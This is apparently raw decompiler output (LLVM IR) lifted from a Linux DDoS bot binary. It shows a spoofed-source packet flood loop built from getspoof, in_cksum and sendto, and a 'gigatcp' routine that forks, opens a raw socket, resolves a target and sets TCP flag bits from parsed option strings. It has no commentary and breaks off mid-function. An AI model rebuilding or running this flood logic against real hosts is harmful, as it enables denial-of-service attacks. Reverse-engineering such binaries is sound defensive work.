  %v2_804e8a6 = bitcast i8* %stack_var_-108 to i16*
  %v2_804e932 = ptrtoint i32* %stack_var_-160 to i32
  %v2_804e938 = ptrtoint i32* %stack_var_-148 to i32
  %v15_804e93e = ptrtoint i32* %stack_var_-88 to i32
  %v12_804e962 = ptrtoint i32* %stack_var_-128 to i32
  %v15_804e96c = ptrtoint i32* %stack_var_-68 to i32
  %v2_804e98a = bitcast i32* %stack_var_-160 to i16*
  %v2_804e996 = ptrtoint i32* %stack_var_-176 to i32
  %v5_804e9e3 = add i32 %v1_804e71d, %v2_804e65d
  br label %dec_label_pc_804e80f

dec_label_pc_804e80f:                             ; preds = %dec_label_pc_804e9fd, %dec_label_pc_804e6f8
  %stack_var_-36.0 = phi i32 [ %v1_804e7eb, %dec_label_pc_804e6f8 ], [ %stack_var_-36.1, %dec_label_pc_804e9fd ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_804e6f8 ], [ %v4_804e9fd, %dec_label_pc_804e9fd ]
  %v2_804e815 = load i32, i32* %v1_804e7d6, align 4
  store i32 %v2_804e815, i32* %stack_var_-300, align 4
  %v1_804e81a = call i32 @atol(i32 %v2_804e815)
  %v1_804e81f = icmp eq i32 %v1_804e81a, 0
  %v1_804e821 = icmp eq i1 %v1_804e81f, false
  br i1 %v1_804e821, label %dec_label_pc_804e82b, label %dec_label_pc_804e823

dec_label_pc_804e823:                             ; preds = %dec_label_pc_804e80f
  %v0_804e823 = call i32 @random()
  br label %dec_label_pc_804e82b

dec_label_pc_804e82b:                             ; preds = %dec_label_pc_804e80f, %dec_label_pc_804e823
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_804e80f ], [ %v0_804e823, %dec_label_pc_804e823 ]
  %v1_804e82b = call i32 @getspoof(i32 %stack_var_-36.1)
  store i32 60, i32* %stack_var_-300, align 4
  %v2_804e842 = call i32 @htons(i16 60)
  %v1_804e84e = call i32 @random()
  %v1_804e869 = urem i32 %v1_804e82b, 65536
  store i32 %v1_804e869, i32* %stack_var_-88, align 4
  %v1_804e87a = call i32 @random()
  store i32 %v2_804e898, i32* %stack_var_-300, align 4
  %v3_804e8a6 = call i32 @in_cksum(i16* %v2_804e8a6, i32 20)
  %v1_804e8b2 = call i32 @random()
  store i32 %v1_804e82b, i32* %stack_var_-160, align 4
  store i32 40, i32* %stack_var_-300, align 4
  %v2_804e923 = call i32 @htons(i16 40)
  store i32 %v15_804e93e, i32* %stack_var_-300, align 4
  %v3_804e950 = call i32 @bcopy(i32 %v15_804e93e, i32 %v2_804e938, i32 20)
  store i32 %v15_804e96c, i32* %stack_var_-300, align 4
  %v3_804e972 = call i32 @bcopy(i32 %v15_804e96c, i32 %v12_804e962, i32 20)
  store i32 %v2_804e932, i32* %stack_var_-300, align 4
  %v3_804e98a = call i32 @in_cksum(i16* %v2_804e98a, i32 52)
  store i32 %v3_804e68f, i32* %stack_var_-300, align 4
  %v6_804e9c7 = call i32 @sendto(i32 %v3_804e68f, i32 %v2_804e898, i32 60, i32 0, i32 %v2_804e996, i32 16)
  %tmp = icmp ult i32 %stack_var_-48.0, 100
  br i1 %tmp, label %dec_label_pc_804e9fd, label %dec_label_pc_804e9d2

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e82b
  store i32 0, i32* %stack_var_-300, align 4
  %v2_804e9d9 = call i32 @__GI_time(i32* null)
  %v7_804e9e6 = icmp ult i32 %v2_804e9d9, %v5_804e9e3
  br i1 %v7_804e9e6, label %dec_label_pc_804e9fd, label %dec_label_pc_804e9ea

dec_label_pc_804e9ea:                             ; preds = %dec_label_pc_804e9d2
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804e9f1 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804e9fd

dec_label_pc_804e9fd:                             ; preds = %dec_label_pc_804e9ea, %dec_label_pc_804e9d2, %dec_label_pc_804e82b
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_804e82b ], [ 0, %dec_label_pc_804e9d2 ], [ 0, %dec_label_pc_804e9ea ]
  %v4_804e9fd = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_804e80f

dec_label_pc_804ea05:                             ; preds = %entry
  ret i32 %v1_804e66b

; uselistorder directives
  uselistorder i32 %v1_804e82b, { 1, 0 }
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %v15_804e96c, { 1, 0 }
  uselistorder i32 %v15_804e93e, { 1, 0 }
  uselistorder i32 %v1_804e7db, { 1, 0 }
  uselistorder i32 %storemerge69, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804e6a9, { 1, 0 }
  uselistorder i32 %v3_804e68f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-300, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e82b, { 1, 0 }
  uselistorder label %dec_label_pc_804e6de, { 1, 0 }
  uselistorder label %dec_label_pc_804e6f2.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e6a9, { 1, 0 }
}

define i32 @gigatcp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp101 = call i8 @__decompiler_undefined_function_5()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-120 = alloca i8, align 1
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ea12 = load i32, i32* @esi, align 4
  store i32 %v0_804ea12, i32* %stack_var_-12, align 4
  %v2_804ea13 = icmp ult i32* %stack_var_-12, inttoptr (i32 544 to i32*)
  store i1 %v2_804ea13, i1* %cf.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_806a700.139 to i32), i32* %edx.global-to-local, align 4
  %v3_804ea34 = bitcast i32* %stack_var_-268 to i16*
  %v4_804ea34 = call i32 @memcpy(i16* %v3_804ea34, i32 ptrtoint (i32* @global_var_806a700.139 to i32), i32 80)
  store i32 ptrtoint (i32* @global_var_806a680.140 to i32), i32* %edx.global-to-local, align 4
  %v3_804ea62 = bitcast i32* %stack_var_-396 to i16*
  %v4_804ea62 = call i32 @memcpy(i16* %v3_804ea62, i32 ptrtoint (i32* @global_var_806a680.140 to i32), i32 124)
  %v2_804ea75 = call i32 @__GI_time(i32* null)
  %v1_804ea83 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea88 = icmp eq i32 %v1_804ea83, 0
  %v1_804ea8a = icmp eq i1 %v1_804ea88, false
  br i1 %v1_804ea8a, label %dec_label_pc_804f255, label %dec_label_pc_804ea90

dec_label_pc_804ea90:                             ; preds = %entry
  %v3_804eaa7 = call i32 @socket(i32 2, i32 3, i32 255)
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eaaf = icmp slt i32 %v3_804eaa7, 0
  %v1_804eab3 = icmp eq i1 %v5_804eaaf, false
  br i1 %v1_804eab3, label %dec_label_pc_804eac1, label %dec_label_pc_804eab5

dec_label_pc_804eab5:                             ; preds = %dec_label_pc_804ea90
  %v1_804eabc = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804eac1

dec_label_pc_804eac1:                             ; preds = %dec_label_pc_804ea90, %dec_label_pc_804eab5
  %v4_804eac1 = add i32 %arg3, -2
  %v8_804eac1 = icmp ult i32 %arg3, 2
  %v9_804eac1 = sub i32 1, %arg3
  %v10_804eac1 = and i32 %v9_804eac1, %arg3
  %v11_804eac1 = icmp slt i32 %v10_804eac1, 0
  store i1 %v8_804eac1, i1* %cf.global-to-local, align 1
  %v12_804eac1 = icmp eq i32 %v4_804eac1, 0
  %v13_804eac1 = icmp slt i32 %v4_804eac1, 0
  %v3_804eac5 = icmp eq i1 %v13_804eac1, %v11_804eac1
  %v4_804eac5 = icmp eq i1 %v12_804eac1, false
  %v5_804eac5 = and i1 %v4_804eac5, %v3_804eac5
  br i1 %v5_804eac5, label %dec_label_pc_804eb0a.preheader, label %dec_label_pc_804eac7

dec_label_pc_804eac7:                             ; preds = %dec_label_pc_804eac1
  %v2_804eadc = call i32 @Send(i32 %arg1, i32 ptrtoint ([45 x i8]* @global_var_806a750.141 to i32))
  %v1_804eae8 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804eb0a.preheader

dec_label_pc_804eb0a.preheader:                   ; preds = %dec_label_pc_804eac1, %dec_label_pc_804eac7
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eaf6

dec_label_pc_804eaf6:                             ; preds = %dec_label_pc_804eb0a.preheader, %dec_label_pc_804eaf6
  %storemerge142 = phi i32 [ 0, %dec_label_pc_804eb0a.preheader ], [ %v4_804eb07, %dec_label_pc_804eaf6 ]
  store i32 %storemerge142, i32* @edx, align 4
  %v0_804eafc = load i32, i32* @ebp, align 4
  %v2_804eafc = mul nuw nsw i32 %storemerge142, 4
  %v3_804eafc = add nuw nsw i32 %v2_804eafc, -264
  %v4_804eafc = add i32 %v3_804eafc, %v0_804eafc
  %v5_804eafc = inttoptr i32 %v4_804eafc to i32*
  %v6_804eafc = load i32, i32* %v5_804eafc, align 4
  %v1_804eb03 = trunc i32 %v6_804eafc to i8
  %v4_804eb03 = add nuw nsw i32 %storemerge142, -76
  %v5_804eb03 = add i32 %v4_804eb03, %v0_804eafc
  %v6_804eb03 = inttoptr i32 %v5_804eb03 to i8*
  store i8 %v1_804eb03, i8* %v6_804eb03, align 1
  %v4_804eb07 = add nuw nsw i32 %storemerge142, 1
  %v9_804eb0a = icmp ult i32 %v4_804eb07, 19
  store i1 %v9_804eb0a, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804eb07, 20
  br i1 %exitcond, label %dec_label_pc_804eb10, label %dec_label_pc_804eaf6

dec_label_pc_804eb10:                             ; preds = %dec_label_pc_804eaf6
  %v1_804eb13 = add i32 %arg4, 4
  %v5_804eb13 = icmp ugt i32 %arg4, -5
  store i1 %v5_804eb13, i1* %cf.global-to-local, align 1
  %v1_804eb16 = inttoptr i32 %v1_804eb13 to i32*
  %v2_804eb16 = load i32, i32* %v1_804eb16, align 4
  %v2_804eb22 = call i32 @host2ip(i32 %arg2, i32 %v2_804eb16)
  %v1_804eb2d = add i32 %arg4, 12
  %v5_804eb2d = icmp ugt i32 %arg4, -13
  store i1 %v5_804eb2d, i1* %cf.global-to-local, align 1
  %v1_804eb30 = inttoptr i32 %v1_804eb2d to i32*
  %v2_804eb30 = load i32, i32* %v1_804eb30, align 4
  %v1_804eb35 = call i32 @atol(i32 %v2_804eb30)
  %v1_804eb40 = add i32 %arg4, 8
  %v5_804eb40 = icmp ugt i32 %arg4, -9
  %v1_804eb43 = inttoptr i32 %v1_804eb40 to i32*
  %v2_804eb43 = load i32, i32* %v1_804eb43, align 4
  store i32 %v2_804eb43, i32* %edx.global-to-local, align 4
  store i1 %v5_804eb13, i1* %cf.global-to-local, align 1
  %v2_804eb6a = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_806a780.142 to i32))
  store i32 2, i32* %stack_var_-188, align 4
  store i8 69, i8* %stack_var_-120, align 1
  %v2_804ebec = and i8 %tmp101, -64
  store i1 %v5_804eb40, i1* %cf.global-to-local, align 1
  %v2_804ebfd = load i32, i32* %v1_804eb43, align 4
  store i1 false, i1* @df, align 1
  %v4_804ec1a = inttoptr i32 %v2_804ebfd to i8*
  store i32 %v2_804ebfd, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7c1.143 to i32), i32* @edi, align 4
  %v7_804ec2c = call i32 @_strncmp(i8* %v4_804ec1a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7c1.143, i32 0, i32 0), i32 4)
  %v8_804ec2c = urem i32 %v7_804ec2c, 2
  %v9_804ec2c = icmp eq i32 %v8_804ec2c, 0
  %v0_804ec2e = load i1, i1* %cf.global-to-local, align 1
  %v2_804ec2e = or i1 %v0_804ec2e, %v9_804ec2c
  %v3_804ec2e = zext i1 %v2_804ec2e to i32
  %v4_804ec2e = load i32, i32* @edx, align 4
  %v5_804ec2e = and i32 %v4_804ec2e, -256
  %v6_804ec2e = or i32 %v3_804ec2e, %v5_804ec2e
  %v7_804ec2e = xor i32 %v6_804ec2e, 1
  store i32 %v7_804ec2e, i32* %edx.global-to-local, align 4
  %v1_804ec36 = trunc i32 %v7_804ec2e to i8
  %v3_804ec36 = zext i1 %v0_804ec2e to i8
  %v15_804ec36 = icmp eq i8 %v1_804ec36, %v3_804ec36
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec3f = icmp eq i1 %v15_804ec36, false
  br i1 %v1_804ec3f, label %dec_label_pc_804ec7c, label %dec_label_pc_804ec41

dec_label_pc_804ec41:                             ; preds = %dec_label_pc_804eb10
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f03d

dec_label_pc_804ec7c:                             ; preds = %dec_label_pc_804eb10
  store i1 %v5_804eb40, i1* %cf.global-to-local, align 1
  %v2_804ec82 = load i32, i32* %v1_804eb43, align 4
  store i1 false, i1* @df, align 1
  %v4_804ec9f = inttoptr i32 %v2_804ec82 to i8*
  store i32 %v2_804ec82, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806a7c5.144 to i32), i32* @edi, align 4
  %v7_804ecb1 = call i32 @_strncmp(i8* %v4_804ec9f, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806a7c5.144, i32 0, i32 0), i32 5)
  %v8_804ecb1 = urem i32 %v7_804ecb1, 2
  %v9_804ecb1 = icmp eq i32 %v8_804ecb1, 0
  %v0_804ecb3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ecb3 = or i1 %v0_804ecb3, %v9_804ecb1
  %v3_804ecb3 = zext i1 %v2_804ecb3 to i32
  %v4_804ecb3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ecb3 = and i32 %v4_804ecb3, -256
  %v6_804ecb3 = or i32 %v3_804ecb3, %v5_804ecb3
  %v7_804ecb3 = xor i32 %v6_804ecb3, 1
  store i32 %v7_804ecb3, i32* %edx.global-to-local, align 4
  %v1_804ecbb = trunc i32 %v7_804ecb3 to i8
  %v3_804ecbb = zext i1 %v0_804ecb3 to i8
  %v15_804ecbb = icmp eq i8 %v1_804ecbb, %v3_804ecbb
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ecc4 = icmp eq i1 %v15_804ecbb, false
  br i1 %v1_804ecc4, label %dec_label_pc_804ece6, label %dec_label_pc_804ecc6

dec_label_pc_804ecc6:                             ; preds = %dec_label_pc_804ec7c
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f03d

dec_label_pc_804ece6:                             ; preds = %dec_label_pc_804ec7c
  store i1 %v5_804eb40, i1* %cf.global-to-local, align 1
  %v2_804ecec = load i32, i32* %v1_804eb43, align 4
  store i1 false, i1* @df, align 1
  %v4_804ed09 = inttoptr i32 %v2_804ecec to i8*
  store i32 %v2_804ecec, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806a7ca.145 to i32), i32* @edi, align 4
  %v7_804ed1b = call i32 @_strncmp(i8* %v4_804ed09, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806a7ca.145, i32 0, i32 0), i32 5)
  %v8_804ed1b = urem i32 %v7_804ed1b, 2
  %v9_804ed1b = icmp eq i32 %v8_804ed1b, 0
  %v0_804ed1d = load i1, i1* %cf.global-to-local, align 1
  %v2_804ed1d = or i1 %v0_804ed1d, %v9_804ed1b
  %v3_804ed1d = zext i1 %v2_804ed1d to i32
  %v4_804ed1d = load i32, i32* %edx.global-to-local, align 4
  %v5_804ed1d = and i32 %v4_804ed1d, -256
  %v6_804ed1d = or i32 %v3_804ed1d, %v5_804ed1d
  %v7_804ed1d = xor i32 %v6_804ed1d, 1
  store i32 %v7_804ed1d, i32* %edx.global-to-local, align 4
  %v1_804ed25 = trunc i32 %v7_804ed1d to i8
  %v3_804ed25 = zext i1 %v0_804ed1d to i8
  %v15_804ed25 = icmp eq i8 %v1_804ed25, %v3_804ed25
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed2e = icmp eq i1 %v15_804ed25, false
  br i1 %v1_804ed2e, label %dec_label_pc_804ed47, label %dec_label_pc_804ed30

dec_label_pc_804ed30:                             ; preds = %dec_label_pc_804ece6
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f03d

dec_label_pc_804ed47:                             ; preds = %dec_label_pc_804ece6
  store i1 %v5_804eb40, i1* %cf.global-to-local, align 1
  %v2_804ed4d = load i32, i32* %v1_804eb43, align 4
  store i1 false, i1* @df, align 1
  %v4_804ed6a = inttoptr i32 %v2_804ed4d to i8*
  store i32 %v2_804ed4d, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806a7cf.146 to i32), i32* @edi, align 4
  %v7_804ed7c = call i32 @_strncmp(i8* %v4_804ed6a, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a7cf.146, i32 0, i32 0), i32 7)
  %v8_804ed7c = urem i32 %v7_804ed7c, 2
  %v9_804ed7c = icmp eq i32 %v8_804ed7c, 0
  %v0_804ed7e = load i1, i1* %cf.global-to-local, align 1
  %v2_804ed7e = or i1 %v0_804ed7e, %v9_804ed7c
  %v3_804ed7e = zext i1 %v2_804ed7e to i32
  %v4_804ed7e = load i32, i32* %edx.global-to-local, align 4
  %v5_804ed7e = and i32 %v4_804ed7e, -256
  %v6_804ed7e = or i32 %v3_804ed7e, %v5_804ed7e
  %v7_804ed7e = xor i32 %v6_804ed7e, 1
  store i32 %v7_804ed7e, i32* %edx.global-to-local, align 4
  %v1_804ed86 = trunc i32 %v7_804ed7e to i8
  %v3_804ed86 = zext i1 %v0_804ed7e to i8
  %v15_804ed86 = icmp eq i8 %v1_804ed86, %v3_804ed86
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed8f = icmp eq i1 %v15_804ed86, false
  br i1 %v1_804ed8f, label %dec_label_pc_804eda8, label %dec_label_pc_804ed91

dec_label_pc_804ed91:                             ; preds = %dec_label_pc_804ed47
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f03d

dec_label_pc_804eda8:                             ; preds = %dec_label_pc_804ed47
  store i1 %v5_804eb40, i1* %cf.global-to-local, align 1
  %v2_804edae = load i32, i32* %v1_804eb43, align 4
  store i1 false, i1* @df, align 1
  %v4_804edcb = inttoptr i32 %v2_804edae to i8*
  store i32 %v2_804edae, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_806a7d6.147 to i32), i32* @edi, align 4
  %v7_804eddd = call i32 @_strncmp(i8* %v4_804edcb, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806a7d6.147, i32 0, i32 0), i32 8)
  %v8_804eddd = urem i32 %v7_804eddd, 2
  %v9_804eddd = icmp eq i32 %v8_804eddd, 0
  %v0_804eddf = load i1, i1* %cf.global-to-local, align 1
  %v2_804eddf = or i1 %v0_804eddf, %v9_804eddd
  %v3_804eddf = zext i1 %v2_804eddf to i32
  %v4_804eddf = load i32, i32* %edx.global-to-local, align 4
  %v5_804eddf = and i32 %v4_804eddf, -256
  %v6_804eddf = or i32 %v3_804eddf, %v5_804eddf
  %v7_804eddf = xor i32 %v6_804eddf, 1
  store i32 %v7_804eddf, i32* @edx, align 4
  %v3_804ede5 = and i32 %v7_804eddd, -256
  %v1_804ede7 = trunc i32 %v7_804eddf to i8
  %v3_804ede7 = zext i1 %v0_804eddf to i8
  %v4_804ede7 = sub nsw i8 %v1_804ede7, %v3_804ede7
  %v15_804ede7 = icmp eq i8 %v4_804ede7, 0
  %v20_804ede7 = zext i8 %v4_804ede7 to i32
  %v23_804ede7 = or i32 %v20_804ede7, %v3_804ede5
  store i32 %v23_804ede7, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804edf0 = icmp eq i1 %v15_804ede7, false
  br i1 %v1_804edf0, label %dec_label_pc_804ee12, label %dec_label_pc_804edf2

dec_label_pc_804edf2:                             ; preds = %dec_label_pc_804eda8
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f03d

dec_label_pc_804ee12:                             ; preds = %dec_label_pc_804eda8
  store i1 %v5_804eb40, i1* %cf.global-to-local, align 1
  %v2_804ee18 = load i32, i32* %v1_804eb43, align 4
  store i32 %v2_804ee18, i32* @eax, align 4
  %v2_804ee25 = call i32 @__GI_strtok(i32 %v2_804ee18, i32 ptrtoint (i32* @global_var_806a7de.148 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f03330 = icmp eq i32 %v2_804ee25, 0
  %v1_804f03737 = icmp eq i1 %v5_804f03330, false
  br i1 %v1_804f03737, label %dec_label_pc_804ee32, label %dec_label_pc_804f03d

dec_label_pc_804ee32:                             ; preds = %dec_label_pc_804ee12, %dec_label_pc_804f01c
  %v3_804efce.in = phi i32 [ %v2_804f02b, %dec_label_pc_804f01c ], [ %v2_804ee25, %dec_label_pc_804ee12 ]
  %stack_var_-87.138 = phi i8 [ %stack_var_-87.0, %dec_label_pc_804f01c ], [ %v2_804ebec, %dec_label_pc_804ee12 ]
  %v3_804efce = inttoptr i32 %v3_804efce.in to i8*
  store i1 false, i1* @df, align 1
  store i32 %v3_804efce.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7e0.149 to i32), i32* @edi, align 4
  %v7_804ee62 = call i32 @_strncmp(i8* %v3_804efce, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7e0.149, i32 0, i32 0), i32 4)
  %v8_804ee62 = urem i32 %v7_804ee62, 2
  %v9_804ee62 = icmp eq i32 %v8_804ee62, 0
  %v0_804ee64 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ee64 = or i1 %v0_804ee64, %v9_804ee62
  %v3_804ee64 = zext i1 %v2_804ee64 to i32
  %v4_804ee64 = load i32, i32* @edx, align 4
  %v5_804ee64 = and i32 %v4_804ee64, -256
  %v6_804ee64 = or i32 %v3_804ee64, %v5_804ee64
  %v7_804ee64 = xor i32 %v6_804ee64, 1
  store i32 %v7_804ee64, i32* @edx, align 4
  %v3_804ee6a = and i32 %v7_804ee62, -256
  %v1_804ee6c = trunc i32 %v7_804ee64 to i8
  %v3_804ee6c = zext i1 %v0_804ee64 to i8
  %v4_804ee6c = sub nsw i8 %v1_804ee6c, %v3_804ee6c
  %v15_804ee6c = icmp eq i8 %v4_804ee6c, 0
  %v20_804ee6c = zext i8 %v4_804ee6c to i32
  %v23_804ee6c = or i32 %v20_804ee6c, %v3_804ee6a
  store i32 %v23_804ee6c, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ee75 = icmp eq i1 %v15_804ee6c, false
  br i1 %v1_804ee75, label %dec_label_pc_804ee85, label %dec_label_pc_804ee77

dec_label_pc_804ee77:                             ; preds = %dec_label_pc_804ee32
  %v2_804ee7b = or i8 %stack_var_-87.138, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ee7b = zext i8 %v2_804ee7b to i32
  store i32 %v7_804ee7b, i32* @eax, align 4
  br label %dec_label_pc_804f01c

dec_label_pc_804ee85:                             ; preds = %dec_label_pc_804ee32
  store i1 false, i1* @df, align 1
  store i32 %v3_804efce.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7e4.150 to i32), i32* @edi, align 4
  %v7_804eeb5 = call i32 @_strncmp(i8* %v3_804efce, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7e4.150, i32 0, i32 0), i32 4)
  %v8_804eeb5 = urem i32 %v7_804eeb5, 2
  %v9_804eeb5 = icmp eq i32 %v8_804eeb5, 0
  %v0_804eeb7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eeb7 = or i1 %v0_804eeb7, %v9_804eeb5
  %v3_804eeb7 = zext i1 %v2_804eeb7 to i32
  %v4_804eeb7 = load i32, i32* @edx, align 4
  %v5_804eeb7 = and i32 %v4_804eeb7, -256
  %v6_804eeb7 = or i32 %v3_804eeb7, %v5_804eeb7
  %v7_804eeb7 = xor i32 %v6_804eeb7, 1
  store i32 %v7_804eeb7, i32* @edx, align 4
  %v3_804eebd = and i32 %v7_804eeb5, -256
  %v1_804eebf = trunc i32 %v7_804eeb7 to i8
  %v3_804eebf = zext i1 %v0_804eeb7 to i8
  %v4_804eebf = sub nsw i8 %v1_804eebf, %v3_804eebf
  %v15_804eebf = icmp eq i8 %v4_804eebf, 0
  %v20_804eebf = zext i8 %v4_804eebf to i32
  %v23_804eebf = or i32 %v20_804eebf, %v3_804eebd
  store i32 %v23_804eebf, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eec8 = icmp eq i1 %v15_804eebf, false
  br i1 %v1_804eec8, label %dec_label_pc_804eed8, label %dec_label_pc_804eeca

dec_label_pc_804eeca:                             ; preds = %dec_label_pc_804ee85
  %v2_804eece = or i8 %stack_var_-87.138, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eece = zext i8 %v2_804eece to i32
  store i32 %v7_804eece, i32* @eax, align 4
  br label %dec_label_pc_804f01c

dec_label_pc_804eed8:                             ; preds = %dec_label_pc_804ee85
  store i1 false, i1* @df, align 1
  store i32 %v3_804efce.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7e8.151 to i32), i32* @edi, align 4
  %v7_804ef08 = call i32 @_strncmp(i8* %v3_804efce, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7e8.151, i32 0, i32 0), i32 4)
  %v8_804ef08 = urem i32 %v7_804ef08, 2
  %v9_804ef08 = icmp eq i32 %v8_804ef08, 0
  %v0_804ef0a = load i1, i1* %cf.global-to-local, align 1
  %v2_804ef0a = or i1 %v0_804ef0a, %v9_804ef08
  %v3_804ef0a = zext i1 %v2_804ef0a to i32
  %v4_804ef0a = load i32, i32* @edx, align 4
  %v5_804ef0a = and i32 %v4_804ef0a, -256
  %v6_804ef0a = or i32 %v3_804ef0a, %v5_804ef0a
  %v7_804ef0a = xor i32 %v6_804ef0a, 1
  store i32 %v7_804ef0a, i32* @edx, align 4
  %v3_804ef10 = and i32 %v7_804ef08, -256
  %v1_804ef12 = trunc i32 %v7_804ef0a to i8
  %v3_804ef12 = zext i1 %v0_804ef0a to i8
  %v4_804ef12 = sub nsw i8 %v1_804ef12, %v3_804ef12
  %v15_804ef12 = icmp eq i8 %v4_804ef12, 0
  %v20_804ef12 = zext i8 %v4_804ef12 to i32
  %v23_804ef12 = or i32 %v20_804ef12, %v3_804ef10
  store i32 %v23_804ef12, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ef1b = icmp eq i1 %v15_804ef12, false
  br i1 %v1_804ef1b, label %dec_label_pc_804ef2b, label %dec_label_pc_804ef1d

dec_label_pc_804ef1d:                             ; preds = %dec_label_pc_804eed8
  %v2_804ef21 = or i8 %stack_var_-87.138, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ef21 = zext i8 %v2_804ef21 to i32
  store i32 %v7_804ef21, i32* @eax, align 4
  br label %dec_label_pc_804f01c

dec_label_pc_804ef2b:                             ; preds = %dec_label_pc_804eed8
  store i1 false, i1* @df, align 1
  store i32 %v3_804efce.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7ec.152 to i32), i32* @edi, align 4
  %v7_804ef5b = call i32 @_strncmp(i8* %v3_804efce, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7ec.152, i32 0, i32 0), i32 4)
  %v8_804ef5b = urem i32 %v7_804ef5b, 2
  %v9_804ef5b = icmp eq i32 %v8_804ef5b, 0
  %v0_804ef5d = load i1, i1* %cf.global-to-local, align 1
  %v2_804ef5d = or i1 %v0_804ef5d, %v9_804ef5b
  %v3_804ef5d = zext i1 %v2_804ef5d to i32
  %v4_804ef5d = load i32, i32* @edx, align 4
  %v5_804ef5d = and i32 %v4_804ef5d, -256
  %v6_804ef5d = or i32 %v3_804ef5d, %v5_804ef5d
  %v7_804ef5d = xor i32 %v6_804ef5d, 1
  store i32 %v7_804ef5d, i32* @edx, align 4
  %v3_804ef63 = and i32 %v7_804ef5b, -256
  %v1_804ef65 = trunc i32 %v7_804ef5d to i8
  %v3_804ef65 = zext i1 %v0_804ef5d to i8
  %v4_804ef65 = sub nsw i8 %v1_804ef65, %v3_804ef65
  %v15_804ef65 = icmp eq i8 %v4_804ef65, 0
  %v20_804ef65 = zext i8 %v4_804ef65 to i32
  %v23_804ef65 = or i32 %v20_804ef65, %v3_804ef63
  store i32 %v23_804ef65, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ef6e = icmp eq i1 %v15_804ef65, false
  br i1 %v1_804ef6e, label %dec_label_pc_804ef7e, label %dec_label_pc_804ef70

dec_label_pc_804ef70:                             ; preds = %dec_label_pc_804ef2b
